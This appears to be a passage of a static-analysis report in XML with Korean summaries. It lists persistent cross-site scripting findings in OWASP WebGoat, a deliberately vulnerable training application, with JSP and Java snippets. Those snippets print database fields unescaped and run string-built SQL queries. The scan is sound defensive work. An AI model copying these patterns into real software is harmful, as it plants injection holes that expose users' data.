					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7663FD44C6B0DD86C6852A47552EE0B1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C4137935661DE85853C7276676292A5F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F2FE3BC120081226E74410BDB97489D6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="47215BA456AD5F401B353ABE130B0FD4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7F274164143B12C14BF1DA8FAA94D879" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="40A86B67EFB5B4D2713215F7062ED321" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E1DC948029712D6E62619C73E7CC4B02" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DEC22F1242E0B95B805AEBB25617B775" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="33EBB348C8C3ECF6BB25F31C3610ACA3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="54FE9CBD5ADE6B8522B477508649E5C3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0AA01D68341F14FFD80EB57F30E66589" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AC55AF30446637A392A23D56F0CDC277" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="60478A21B52A33B933C2C893B887E054" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A4ADB54F97EA4102AEFEF3F83EB9FE05" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EDF8A46B61B836CABDDD520B54B33001" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>130</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F9E12F3984025858C8D049FA2EB705FB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BD03DB466AC4B2788B4128849DC36740" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C1F248A250C9E2EF82B68C5657FB084E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EB799456BC58D90EB59CC13133874BB3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1C7CD4F69A97886A47348DBD1FD4BD78" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
